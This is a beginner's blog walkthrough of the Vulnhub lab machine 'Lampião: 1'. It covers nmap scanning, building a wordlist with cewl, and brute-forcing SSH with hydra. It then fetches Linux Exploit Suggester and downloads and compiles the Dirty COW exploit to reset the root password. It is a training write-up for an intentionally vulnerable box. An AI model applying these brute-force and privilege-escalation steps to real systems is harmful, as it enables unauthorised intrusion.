---
layout: post
title: "Lampião: 1 Vulnhub box Walkthrough"
img: hacker.jpg # Add image post (optional)
date: 2018-09-30 23:54:00 +0300
description: A walkthrough of intentionally vulnerable  box for beginners. # Add post description (optional)
tag: [Hack , Vulnhub_Box , Pentest]
---
Hi there, This is gonna be a walkthrough on an intentionally vulnerable box for beginners who is just starting to practice on vulnerable boxes from vulnhub. 'Lampião: 1' is an intentionally vulnerable ubuntu machine created by 'Tiago Tavares' for beginners. 

Before getting into the practice on boot2root. Let me tell you the requirments of starting practice on vulnerable machines. It's good if you have kali linux installed on your system as primary OS or Virtual Machine will also be fine. I would recommend to have virtual box installed on you system which is absolutely free of cost. Now let's download 'Lampiao:1' box from vulnhub website. Basically you get .vmdk file in a zipped folder which can be run in virtual box. Once downloaded, unzip the lampiao.zip folder and you can see 'Lampiao-disk1.vmdk' file in the folder. Now open virtualbox, you can see a 'New' button and top left corner, just click on it and go next until it takes you to finish. Once finished, you can see it in the left panel of virtualbox. Select that and click on settings button on top, go to network tab and choose 'Bridged Adapter' in 'Attached to:' section. Jump up to 'Storage' tab and under 'Controller SCSI' section you can see 'Hard Disk:' tab. You got to choose '.vmdk' file there. So navigate to Lampiao folder and 'Lampiao.vmdk' file. That's all, we are good to go. Let's now start the vm and head up to our kali machine.

Lampiao is a vulnerable machine for beginners who is starting his/her career in hacking or penetration testing. In this box you have to find a flag and boot it to root. Let's dive into it and see how can we own root.

Now fire up your kali machine and open up terminal to figure out the ip address of target machine using 'netdiscover' command(in my case it's 192.168.1.5). Let's now start gathering some information about the target machine. Let's scan the ports running on the machine first and for that we are gonna be using one of the best tools called 'nmap'. In order to use nmap, open terminal and type 'nmap -sV -p- ipaddress(in my case 192.168.1.5)'. So basically we are asking nmap to scan all ports by giving '-p-' command and all the running services by giving '-sV' command. Refer the screenshot.

![](/assets/img/vulnhub_box/Lampiao-1/1.png){:class="img-responsive"}

meanwhile open up your browser and let's check if this box is having any web application running on it. As we can see in screenshot, an application is running on port 80 but we can not find much on here.

![](/assets/img/vulnhub_box/Lampiao-1/2.png){:class="img-responsive"}

Let's have a look on nmap result. As you can see, there are three ports open 22,80 and 1898. We have already checked port 80 and we didn't find anything good.

![](/assets/img/vulnhub_box/Lampiao-1/3.png){:class="img-responsive"}

Let's have a look what do we have on port 1898. Let's try it in browser. As we can see we have Drupal running on this port. We'll see if we can find someting useful here.

![](/assets/img/vulnhub_box/Lampiao-1/4.png){:class="img-responsive"}

As you can see the post in it which is submitted by someone called 'tiago'. This can be one of the Users and we can try connecting this user via ssh on port 22 as it's opened. We got to have password this particular user in order to connect via ssh. Let's have a look what do we have next.

![](/assets/img/vulnhub_box/Lampiao-1/5.png){:class="img-responsive"}

Click on the hilighted part and let's see what do we have there.

![](/assets/img/vulnhub_box/Lampiao-1/6.png){:class="img-responsive"}

As you can see it redirects us to another page which seems to be having written history about something or someone. We can find the password for the user hidden somewhere in this post.

![](/assets/img/vulnhub_box/Lampiao-1/7.png){:class="img-responsive"}

For that we are gonna be using an inbuilt tool in kali called 'cewl' which will extract all the words in the particular and we'll a wordlist so that we can use that for bruteforcing the user(tiago) that we have found. Use the hilighted command to do so. Basically we are extracting the words and saving it in a text file called 'wordlist' in /root/Desktop/Lampiao directory.

![](/assets/img/vulnhub_box/Lampiao-1/8.png){:class="img-responsive"}

Let's now try to bruteforce the user on ssh using a tool called 'THC-Hydra'. use the command 'hydra -l tiago -P wordlist_directory ssh://target_ip_address' to crack the password of 'tiago' user.

![](/assets/img/vulnhub_box/Lampiao-1/9.png){:class="img-responsive"}

WOOHOO!!! We have found the password of the user(tiago).

![](/assets/img/vulnhub_box/Lampiao-1/10.png){:class="img-responsive"}

Let's now try to connect it using ssh. Use command 'ssh tiago@target_ip_address(192.168.1.5)' and paste the password that we have found using hydra.

![](/assets/img/vulnhub_box/Lampiao-1/11.png){:class="img-responsive"}

Here we go.... We are able to connect via ssh. We have user(tiago) running on ssh.

![](/assets/img/vulnhub_box/Lampiao-1/12.png){:class="img-responsive"}

We can now execute any linux command as its running ubuntu. But we don't have anything here.

![](/assets/img/vulnhub_box/Lampiao-1/13.png){:class="img-responsive"}

Let's now check if we can run 'wget' command so that we can download and run some exploit on the machine. As you can see we are able to do wget on the machine.

![](/assets/img/vulnhub_box/Lampiao-1/14.png){:class="img-responsive"}

We are gonna be downloading 'Linux Exploit Suggester' and run it on target machine which will show us the exploits available on the machine. We can download 'Linux Exploit Suggester' from 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh'. Run the command as in screenshot that will download 'Linux Exploit Suggester' as 'les.sh'.

![](/assets/img/vulnhub_box/Lampiao-1/15.png){:class="img-responsive"}

![](/assets/img/vulnhub_box/Lampiao-1/16.png){:class="img-responsive"}

![](/assets/img/vulnhub_box/Lampiao-1/17.png){:class="img-responsive"}

Let's now change the permission to execute the les.sh file. Use the 'chmod' command.

![](/assets/img/vulnhub_box/Lampiao-1/18.png){:class="img-responsive"}

It's time to run the file and see what are the exploits available for this machine. Use './les.sh' to see the exploits. There are plenty number of exploits available for this machine.

![](/assets/img/vulnhub_box/Lampiao-1/19.png){:class="img-responsive"}

But we are gonna be using 'dirtycow 2' which we change the password of root by itself.

![](/assets/img/vulnhub_box/Lampiao-1/20.png){:class="img-responsive"}

We have to download dirtycow 2 on the target machine and run. We are gonna be using 'wget' command again to download the exploit. The link to download exploit can be found in the exploit section itself.

![](/assets/img/vulnhub_box/Lampiao-1/21.png){:class="img-responsive"}

It downloads 40847.cpp file which is a c++ program. Let's now excute using g++. Refer the screenshot for command.

![](/assets/img/vulnhub_box/Lampiao-1/22.png){:class="img-responsive"}

Once we execute the 40847.cpp file, we get another file(dcow) created. We can run it and this will change root password to 'dirtyCowFun'.

![](/assets/img/vulnhub_box/Lampiao-1/23.png){:class="img-responsive"}

Let's now connect root using ssh and see if we can find our flag there. The root password is 'dirtyCowFun'.

![](/assets/img/vulnhub_box/Lampiao-1/24.png){:class="img-responsive"}

When we list the directory we can find a file(flag.txt) which is our flag. Let's open and see using 'cat' command. Here we go, we have our flag here.

 Thanks for reading... Happy Hacking.....
 Visit my website
